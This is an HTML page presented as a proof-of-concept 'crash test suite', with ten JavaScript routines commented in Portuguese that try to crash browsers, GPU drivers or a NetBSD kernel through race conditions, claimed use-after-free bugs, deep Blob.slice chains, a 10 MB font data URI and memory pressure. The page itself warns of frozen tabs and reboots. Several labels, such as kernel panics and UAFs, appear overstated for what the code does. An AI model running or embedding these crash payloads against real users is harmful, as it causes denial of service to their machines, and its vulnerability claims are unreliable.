
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser/Kernel Crash Test Suite (PoC)</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #1a1a1a;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        h1 {
            color: #ff5555;
            text-shadow: 1px 1px 2px #000;
        }
        .container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
            width: 100%;
            max-width: 600px;
        }
        button {
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            padding: 15px;
            text-align: left;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            border-radius: 4px;
        }
        button:hover {
            background-color: #444;
            border-color: #777;
        }
        button:active {
            background-color: #ff5555;
            color: #000;
            transform: scale(0.98);
        }
        .warning {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
            text-align: center;
            border-top: 1px solid #333;
            padding-top: 10px;
        }
    </style>
</head>
<body>

    <h1>Crash Test Suite (v1.0)</h1>

    <div class="container">
        <button onclick="crashSCTPStreamReset()">01. WebRTC SCTP Stream Reset UAF (NetBSD Kernel Panic)</button>
        <button onclick="crashCanvasFontLoading()">02. Canvas fillText Font Loading Race (Layout Engine Crash)</button>
        <button onclick="crashWebGLQueryAvailability()">03. WebGL Query Result Availability Race (GPU Driver Panic)</button>
        <button onclick="crashRTCPeerConnectionGC()">04. RTCPeerConnection Garbage Collection Race (UAF)</button>
        <button onclick="crashBlobSliceRecursion()">05. Blob.slice() Infinite Recursion (Kernel Stack Overflow)</button>
        <button onclick="crashKeyframeEffectSource()">06. KeyframeEffect Source Buffer Mutation (Animation Crash)</button>
        <button onclick="crashFileReaderSyncWorker()">07. FileReaderSync Worker Thread Detach (IO Panic)</button>
        <button onclick="crashCSSFontFaceSrc()">08. CSS @font-face src descriptor Data URI Overflow</button>
        <button onclick="crashIndexedDBUpgradeRace()">09. IndexedDB Version Upgrade Transaction Race (Database Corruption)</button>
        <button onclick="crashWebGLShaderPrecision()">10. WebGL Shader Precision Qualifier Overflow (Compiler Crash)</button>
    </div>

    <div class="warning">
        WARNING: These scripts utilize memory corruption, race conditions, and heavy resource exhaustion.<br>
        Expect browser tabs to close, freezes, or system reboots.
    </div>

    <script>
    // ==========================================
    // 01. WebRTC SCTP Stream Reset Use-After-Free
    // ==========================================
    function crashSCTPStreamReset() {
        console.log("Iniciando SCTP Crash...");
        if (!window.RTCPeerConnection) return;
        const pc = new RTCPeerConnection();
        const dc = pc.createDataChannel("crash", {negotiated: true, id: 0});
        
        // Simula estado de conexão aberta (necessário tráfego real para crash total)
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(e=>{});
        
        setTimeout(() => {
            // Tenta fechar o canal (que envia reset SCTP)
            dc.close();
            
            // Imediatamente destrói a associação SCTP inteira
            pc.close();
            
            // Aloca lixo para preencher memória libertada
            const junk = new Array(5000).fill(0x41414141);
        }, 10);
    }

    // ==========================================
    // 02. Canvas Font Loading Race
    // ==========================================
    function crashCanvasFontLoading() {
        console.log("Iniciando Canvas Font Race...");
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        // URL lenta ou inválida para forçar espera
        const f = new FontFace("CrashFont", "url(http://localhost:9999/slow-font.woff)"); 
        document.fonts.add(f);
        
        f.load().catch(e=>{});
        
        // Loop de desenho frenético enquanto a fonte carrega
        const iv = setInterval(() => {
            ctx.font = "40px CrashFont";
            try {
                // Desenha texto massivo para manter a engine ocupada
                ctx.fillText("A".repeat(1000), 0, 50);
                
                // Tenta limpar a fonte do set no meio
                if(Math.random() > 0.5) document.fonts.clear();
                else document.fonts.add(f);
                
            } catch(e) {}
        }, 0);
        
        setTimeout(() => clearInterval(iv), 2000);
    }

    // ==========================================
    // 03. WebGL Query Result Availability Race
    // ==========================================
    function crashWebGLQueryAvailability() {
        console.log("Iniciando WebGL Query Race...");
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl2');
        if(!gl) {
            console.log("WebGL2 não suportado.");
            return;
        }
        
        const q = gl.createQuery();
        gl.beginQuery(gl.ANY_SAMPLES_PASSED, q);
        
        // Desenha algo
        gl.clearColor(0,0,1,1);
        gl.clear(gl.COLOR_BUFFER_BIT);
        
        gl.endQuery(gl.ANY_SAMPLES_PASSED);
        
        // Race: Get Parameter vs Delete
        try {
            for(let i=0; i<100; i++) {
                // Checa disponibilidade (acessa driver)
                gl.getQueryParameter(q, gl.QUERY_RESULT_AVAILABLE);
                
                if (i === 50) {
                    // Deleta no meio do loop
                    gl.deleteQuery(q);
                }
            }
        } catch(e) {}
    }

    // ==========================================
    // 04. RTCPeerConnection GC UAF
    // ==========================================
    function crashRTCPeerConnectionGC() {
        console.log("Iniciando RTCPeerConnection GC Storm...");
        function trigger() {
            let pc = new RTCPeerConnection();
            // Inicia operação assíncrona pesada
            pc.createOffer({offerToReceiveAudio: 1, offerToReceiveVideo: 1}).then(() => {
                // Callback vazio, mas o código nativo tentará acessar 'pc' aqui
            });
            
            // Remove referência forte
            pc = null;
        }
        
        // Cria milhares para garantir que o GC rode
        for(let i=0; i<1000; i++) {
            trigger();
        }
        
        // Pressão de memória auxiliar
        const pressure = [];
        try {
            for(let i=0; i<1000; i++) pressure.push(new Uint8Array(1024*100));
        } catch(e) {}
    }

    // ==========================================
    // 05. Blob.slice() Stack Overflow
    // ==========================================
    function crashBlobSliceRecursion() {
        console.log("Iniciando Blob Recursion...");
        const buf = new ArrayBuffer(1024);
        let blob = new Blob([buf]);
        
        // Profundidade insana
        for(let i=0; i<20000; i++) {
            blob = blob.slice(0, 500); 
        }
        
        // Leitura força resolução da cadeia
        const fr = new FileReader();
        fr.readAsArrayBuffer(blob);
    }

    // ==========================================
    // 06. KeyframeEffect Animation Crash
    // ==========================================
    function crashKeyframeEffectSource() {
        console.log("Iniciando Animation Mutator...");
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        const frames = [{ opacity: 0 }, { opacity: 1 }];
        const effect = new KeyframeEffect(div, frames, { duration: 1000, iterations: Infinity });
        const anim = new Animation(effect, document.timeline);
        anim.play();
        
        // Mutação rápida de keyframes
        const iv = setInterval(() => {
            try {
                // Seta novos keyframes com dados inválidos/nulos misturados
                effect.setKeyframes([
                    { opacity: Math.random() }, 
                    { opacity: null }, 
                    { transform: "translate3d(0,0,0)" }
                ]);
                
                // Tenta destruir o elemento alvo no meio da animação
                if(Math.random() > 0.95) {
                    div.remove();
                    clearInterval(iv);
                }
            } catch(e) {}
        }, 10);
    }

    // ==========================================
    // 07. FileReaderSync Worker Panic
    // ==========================================
    function crashFileReaderSyncWorker() {
        console.log("Iniciando Worker IO Panic...");
        const blob = new Blob([new Uint8Array(1024*1024*50)]); // 50MB Blob
        
        const code = `
            onmessage = function(e) {
                const blob = e.data;
                const fr = new FileReaderSync();
                // Leitura bloqueante de 50MB
                fr.readAsArrayBuffer(blob);
                postMessage("done");
            }
        `;
        
        const w = new Worker(URL.createObjectURL(new Blob([code], {type: 'text/javascript'})));
        w.postMessage(blob);
        
        // Mata o worker após alguns ms (esperando pegar no meio do readAsArrayBuffer)
        setTimeout(() => {
            w.terminate(); 
        }, 10);
    }

    // ==========================================
    // 08. CSS @font-face Buffer Overflow
    // ==========================================
    function crashCSSFontFaceSrc() {
        console.log("Iniciando CSS Parser Overflow...");
        const style = document.createElement('style');
        // Gera URI gigante
        const hugeBase64 = "A".repeat(1024 * 1024 * 10); 
        
        style.textContent = `
            @font-face {
                font-family: 'Crash';
                src: url('data:font/woff;base64,${hugeBase64}');
            }
        `;
        
        // Injeção força parsing síncrono
        document.head.appendChild(style);
        
        // Força uso
        document.body.style.fontFamily = 'Crash';
    }

    // ==========================================
    // 09. IndexedDB Transaction Race
    // ==========================================
    function crashIndexedDBUpgradeRace() {
        console.log("Iniciando IndexedDB Race...");
        const req = indexedDB.open("CrashDB", Math.random()); // Nova versão sempre
        
        req.onupgradeneeded = function(e) {
            const db = e.target.result;
            const trans = e.target.transaction;
            
            const store = db.createObjectStore("store");
            
            // Race: Aborta transação e fecha conexão simultaneamente
            trans.abort();
            db.close();
            
            try {
                // Tenta usar a store "zumbi"
                store.add("data", "key");
            } catch(e) {}
        };
    }

    // ==========================================
    // 10. WebGL Shader Precision Overflow
    // ==========================================
    function crashWebGLShaderPrecision() {
        console.log("Iniciando GLSL Compiler Crash...");
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        if(!gl) return;
        
        let shaderSrc = "precision highp float;\nvoid main() {\n";
        // Gera complexidade aninhada
        for(let i=0; i<1000; i++) {
            shaderSrc += "float v" + i + " = " + i + ".0;\n";
        }
        // Operação massiva com todos
        shaderSrc += "gl_FragColor = vec4(";
        for(let i=0; i<1000; i++) shaderSrc += "v" + i + (i==999 ? "" : "+");
        shaderSrc += ", 0, 0, 1);\n}";
        
        const s = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(s, shaderSrc);
        // Compilação pesada
        gl.compileShader(s);
        
        // Checa status (força espera do driver)
        gl.getShaderParameter(s, gl.COMPILE_STATUS);
    }
    </script>
</body>
</html>
